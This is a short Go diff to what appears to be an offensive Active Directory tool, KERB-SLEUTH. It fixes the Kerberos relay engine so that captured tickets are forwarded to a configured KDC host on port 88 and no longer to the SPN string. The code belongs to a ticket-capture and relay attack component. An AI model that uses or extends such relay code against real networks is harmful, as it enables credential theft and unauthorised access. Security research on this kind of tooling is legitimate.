@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"strings"
 	"time"
 
 	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/krb"
@@ -14,6 +15,7 @@ import (
 type KerberosRelayEngine struct {
 	Domain          string
 	TargetSPN       string
+	KDCHost         string // Kerberos server hostname or IP (required for relay; never use SPN as host)
 	RelayPort       int
 	IsListening     bool
 	CapturedTickets []*CapturedTicket
@@ -140,8 +142,15 @@ func (kre *KerberosRelayEngine) parseKerberosMessage(data []byte) (*CapturedTick
 func (kre *KerberosRelayEngine) relayToTarget(data []byte) error {
 	log.Printf("[*] Relaying to target: %s", kre.TargetSPN)
 
-	// Connect to target
-	conn, err := net.Dial("tcp", kre.TargetSPN+":88")
+	host := strings.TrimSpace(kre.KDCHost)
+	if host == "" {
+		return fmt.Errorf("Kerberos relay requires KDCHost (do not use TargetSPN as a hostname)")
+	}
+	addr := host
+	if !strings.Contains(host, ":") {
+		addr = host + ":88"
+	}
+	conn, err := net.Dial("tcp", addr)
 	if err != nil {
 		return fmt.Errorf("failed to connect to target: %v", err)
 	}
